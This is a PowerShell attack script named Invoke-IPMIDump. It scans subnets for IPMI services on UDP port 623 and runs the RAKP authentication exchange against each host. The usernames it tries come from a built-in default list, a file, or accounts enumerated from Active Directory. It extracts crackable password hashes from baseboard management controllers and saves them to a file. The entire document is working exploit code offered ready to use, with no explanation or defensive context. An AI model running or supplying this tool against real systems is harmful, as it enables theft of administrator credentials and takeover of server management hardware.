function Get-SubnetAddresses {
    Param (
        [IPAddress]$IP,
        [ValidateRange(0, 32)][int]$MaskBits
    )

    $mask = ([Math]::Pow(2, $MaskBits) - 1) * [Math]::Pow(2, (32 - $MaskBits))
    $maskbytes = [BitConverter]::GetBytes([UInt32] $mask)
    $DottedMask = [IPAddress]((3..0 | ForEach-Object { [String] $maskbytes[$_] }) -join '.')

    $lower = [IPAddress] ( $ip.Address -band $DottedMask.Address )

    $LowerBytes = [BitConverter]::GetBytes([UInt32] $lower.Address)
    [IPAddress]$upper = (0..3 | % { $LowerBytes[$_] + ($maskbytes[(3 - $_)] -bxor 255) }) -join '.'

    $ips = @($lower, $upper)
    return $ips
}

function Get-IPRange {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.IPAddress]$Lower,

        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.IPAddress]$Upper
    )

    $IPList = [Collections.ArrayList]::new()
    $null = $IPList.Add($Lower)
    $i = $Lower
    while ( $i -ne $Upper ) { 
        $iBytes = [BitConverter]::GetBytes([UInt32] $i.Address)
        [Array]::Reverse($iBytes)
        $nextBytes = [BitConverter]::GetBytes([UInt32]([bitconverter]::ToUInt32($iBytes, 0) + 1))
        [Array]::Reverse($nextBytes)
        $i = [IPAddress]$nextBytes
        $null = $IPList.Add($i)
    }
    return $IPList
}


function Send-Receive {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.Sockets.UdpClient]$Sock,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$IP,

        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [Byte[]]$Data,

        [Parameter(Mandatory = $true)]
        [ValidateRange(1, 65535)]
        [int]$Port
    )

    $remoteEP = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IP), $Port)
    $receivedBytes = $Sock.Send($Data, $Data.Length, $remoteEP)
    $receiveBytes = $Sock.Receive([ref]$remoteEP)
    return $receiveBytes
}


function Test-IP {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$IP,

        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [Byte[]]$SessionID,

        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.Sockets.UdpClient]$Sock,

        [Parameter(Mandatory = $true)]
        [ValidateRange(1, 65535)]
        [int]$Port
    )

    $attemptLimit = 5
    $attemptCount = 0

    while ($attemptCount -lt $attemptLimit) {

        $data = 0x06, 0x00, 0xff, 0x07
        $data += 0x06, 0x10, 0x00, 0x00
        $data += 0x00, 0x00, 0x00, 0x00
        $data += 0x00, 0x00, 0x20, 0x00
        $data += 0x00, 0x00, 0x00, 0x00
        $data += $SessionID
        $data += 0x00, 0x00, 0x00, 0x08
        $data += 0x01, 0x00, 0x00, 0x00
        $data += 0x01, 0x00, 0x00, 0x08
        $data += 0x01, 0x00, 0x00, 0x00
        $data += 0x02, 0x00, 0x00, 0x08
        $data += 0x01, 0x00, 0x00, 0x00

        try {
            $sResponse1 = Send-Receive -Sock $Sock -IP $IP -Data $data -Port $Port
            return $sResponse1
        }

        catch [System.Net.Sockets.SocketException] {
            Write-Verbose "[S] $IP does not have IPMI/RMCP+ running or is not vulnerable (Attempt $attemptCount)(User=$User)"
            $attemptCount++

            if ($attemptCount -eq $attemptLimit) {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "IPMI not running or not vulnerable on $IP"
                $Sock.Close()
                return -111
            }
        }
    }
}

function Attempt-Retrieve {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$User,

        [Parameter(Mandatory = $true)]
        [ValidatePattern('^\d{1,3}(\.\d{1,3}){3}$')]
        [string]$IP,

        [Parameter(Mandatory = $true)]
        [ValidateRange(1, 65535)]
        [int]$Port
    )

    $attemptLimit  = 3
    $attemptCount  = 0

    while ($attemptCount -lt $attemptLimit) {

        $rSessionID = (30..90) + (97..122) | Get-Random -Count 4 | ForEach-Object { [byte[]]$_ }
        $sock = New-Object System.Net.Sockets.UdpClient
        $sock.Client.ReceiveTimeout = 250

        $tResponse = Test-IP -IP $IP -SessionID $rSessionID -Port $Port -Sock $sock
        if ($tResponse -eq -111) {
            $sock.Close()
            return -111
        }

        if ($tResponse.Length -gt 0) {

            $rRequestSALT = (30..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [byte[]]$_ }
            $sUserLength1 = [byte]($User.Length + 28), 0x00
            $sUserLength2 = [byte]$User.Length
            $sHexUser     = [System.Text.Encoding]::ASCII.GetBytes($User)
            $rRequestID   = $tResponse[24..27]

            $data  = 0x06, 0x00, 0xff, 0x07
            $data += 0x06, 0x12
            $data += 0x00, 0x00, 0x00, 0x00
            $data += 0x00, 0x00, 0x00, 0x00
            $data += $sUserLength1
            $data += 0x00, 0x00, 0x00, 0x00
            $data += $rRequestID
            $data += $rRequestSALT
            $data += 0x14, 0x00, 0x00
            $data += $sUserLength2
            $data += $sHexUser

            try {
                $sResponse1    = Send-Receive -Sock $sock -IP $IP -Data $data -Port $Port
                $iMessageLength = $sResponse1[14]

                if ($sResponse1[17] -eq 18) {
                    # invalid username
                    return
                }

                if ($iMessageLength -eq 60) {

                    $sResponseData = $sResponse1[24..$sResponse1.Length]

                    if (($sResponseData.Length * 2) -eq (($iMessageLength - 8) * 2)) {

                        $global:IPMI_halt = $true

                        $rSessionIDHex    = ($rSessionID                             | ForEach-Object ToString X2) -join ''
                        $rRequestIDHex    = ($rRequestID                             | ForEach-Object ToString X2) -join ''
                        $rResponseSALTHex = ($sResponseData[0..31]                  | ForEach-Object ToString X2) -join ''
                        $rResponseHashHex = ($sResponseData[32..$sResponseData.Length] | ForEach-Object ToString X2) -join ''
                        $sUserLength2Hex  = ($sUserLength2                           | ForEach-Object ToString X2) -join ''
                        $sHexUserHex      = ($sHexUser                               | ForEach-Object ToString X2) -join ''
                        $rRequestSALTHex  = ($rRequestSALT                           | ForEach-Object ToString X2) -join ''

                        $Hash  = $rSessionIDHex + $rRequestIDHex + $rRequestSALTHex +
                                 $rResponseSALTHex + '14' + $sUserLength2Hex +
                                 $sHexUserHex + ':' + $rResponseHashHex
                        $Hash = $Hash.ToLower()

                        # print as before
                        Write-Host
                        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                        Write-Host "[$IP] "
                        Write-Host
                        $User + ":" + $Hash | Write-Host
                        Write-Host

                        # store result line for later saving
                        if (-not $script:FinalResults) {
                            $script:FinalResults = @()
                        }
                        $script:FinalResults += "[$IP] $($User):$($Hash)"

                        # stop retry loop
                        $attemptCount = $attemptLimit
                    }

                }
                else {
                    $sock.Close()
                    return
                }

            }
            catch {
                $attemptCount++
                Write-Verbose "[A] Trying user again (Attempt=$attemptCount)(User=$User)"
                $sock.Close()
            }
            finally {
                $sock.Close()
            }
        }
    }
}

function Invoke-IPMIDump {
    [CmdletBinding(DefaultParameterSetName = 'Default')]
    Param(
        [Parameter(Mandatory = $false)]
        [string]$Users,

        [Parameter(Mandatory = $true)]
        [string]$IP,

        [Parameter(ParameterSetName = 'IncludeDisabled')]
        [switch]$IncludeDisabled,

        [Parameter()]
        [int]$Port = 623,
		
		[Parameter (Mandatory = $False)]
		[String] $OutputFile,
		
		[switch] $NoPortScan
    )

    function Get-DomainUsers {
        $directoryEntry = [ADSI]"LDAP://$env:USERDNSDOMAIN"
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
        $searcher.PageSize = 1000
        if ($IncludeDisabled) {
            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(SamAccountName=*))"
        } else {
            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(SamAccountName=*))"
        }
        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))

        try {
            $results = $searcher.FindAll()
            $results | ForEach-Object {
                $samAccountName = $_.Properties["samAccountName"][0]
                if ($samAccountName -ne $null) {
                    $samAccountName
                }
            }
        } catch {
            Write-Error "Failed to query Active Directory: $_"
            return $null
        }
    }

    if ($Users -eq "Domain Users") {
        $IPMIUsers = Get-DomainUsers
    }

    if ($IP.Contains("/")) {
        $mb = $IP.Split("/")[1]
        $IP = $IP.Split("/")[0]
        $ips = Get-SubnetAddresses -MaskBits $mb -IP $IP
        $ipAddresses = Get-IPRange -Lower $ips[0] -Upper $ips[1]
    } else {
        $ipAddresses = @($IP)
    }
	
	if(!$NoPortScan){
		$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
		$runspacePool.Open()
	
		$scriptBlock = {
			param ($computer, $Port)

			# local defaults inside the block (no extra args needed)
			$timeoutMs = 300

			# Pick a tiny probe; proper RMCP Presence Ping for IPMI (UDP 623)
			$packet = if ($Port -eq 623) {
				# RMCP/ASF Presence Ping (12 bytes)
				[byte[]](0x06,0x00,0xFF,0x06,0x00,0x00,0x11,0xBE,0x80,0x00,0x00,0x00)
			} else {
				[byte[]](0x00)
			}

			# Open UDP client to remote host:port
			$socket = New-Object System.Net.Sockets.UdpClient($computer, $Port)
			$socket.Client.ReceiveTimeout = $timeoutMs
			try {
				# Send probe
				[void]$socket.Send($packet, $packet.Length)

				# Prepare receive endpoint and block (with timeout) for any reply
				$recv = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
				$received = $socket.Receive([ref]$recv)

				if ($received -and $received.Length -gt 0) {
					return $computer  # treat reply as "open"
				}
			}
			catch [System.Net.Sockets.SocketException] {
				# 10060 == timeout (open|filtered) → return $null to avoid false positives
				# 10054 == ICMP port unreachable (closed) → return $null
				return $null
			}
			catch { return $null }
			finally { $socket.Close() }
		}
	
		$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'
	
		foreach ($computer in $ipAddresses) {
			$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer).AddArgument($Port)
			$powerShellInstance.RunspacePool = $runspacePool
			$runspaces.Add([PSCustomObject]@{
				Instance = $powerShellInstance
				Status   = $powerShellInstance.BeginInvoke()
			})
		}
	
		$reachable_hosts = @()
		foreach ($runspace in $runspaces) {
			$result = $runspace.Instance.EndInvoke($runspace.Status)
			if ($result) {
				$reachable_hosts += $result
			}
		}
	
		$ipAddresses = $reachable_hosts
	
		$runspacePool.Close()
		$runspacePool.Dispose()
	}
	
	if(!$ipAddresses){
		Write-Output ""
		Write-Output "[-] No Hosts found where port $Port is open"
		Write-Output ""
		break
	}

    foreach ($ip in $ipAddresses) {
        $global:IPMI_halt = $false
        if ([string]::IsNullOrEmpty($Users)) {
            $IPMIUsers = @(
                "Admin", "admin", "administrator", "ADMIN", "root", "USERID",
                "ipmiadmin", "superuser", "operator", "service", "support",
                "guest", "default", "system", "remote", "supervisor", "tech",
                "Administrator", "manager", "test"
            )
            foreach ($user in $IPMIUsers) {
                if ($global:IPMI_halt) { break }
                $res = Attempt-Retrieve -User $user -Port $Port -IP $ip
                if ($res -eq -111) {
                    break
                }
            }
        } elseif ($Users -eq "Domain Users") {
            foreach ($user in $IPMIUsers) {
                if ($global:IPMI_halt) { break }
                $res = Attempt-Retrieve -User $user -Port $Port -IP $ip
                if ($res -eq -111) {
                    break
                }
            }
        } else {
            if ([System.IO.File]::Exists($Users)) {
                Get-Content $Users | ForEach-Object {
                    Start-Sleep -Milliseconds 100
                    $res = Attempt-Retrieve -User $_ -Port $Port -IP $ip
                    if ($res -eq -111) {
                        break
                    }
                }
            } else {
                Attempt-Retrieve -User $Users -Port $Port -IP $ip
            }
        }
    }
	
	if ($FinalResults) {

		if (-not $OutputFile) { $OutputFile = "$pwd\IPMIResults.txt" }

		$utf8NoBom = New-Object System.Text.UTF8Encoding $false
		[System.IO.File]::WriteAllLines($OutputFile, $FinalResults, $utf8NoBom)

		Write-Output ""
		if ($OutputFile) {
			Write-Output " Output saved to: $OutputFile"
		}
		else {
			Write-Output " Output saved to: $pwd\IPMIResults.txt"
		}
		Write-Output ""
	}
	else {
		Write-Output " No hosts found where IPMI is running."
		Write-Output ""
	}
	
	$script:FinalResults = $null
}
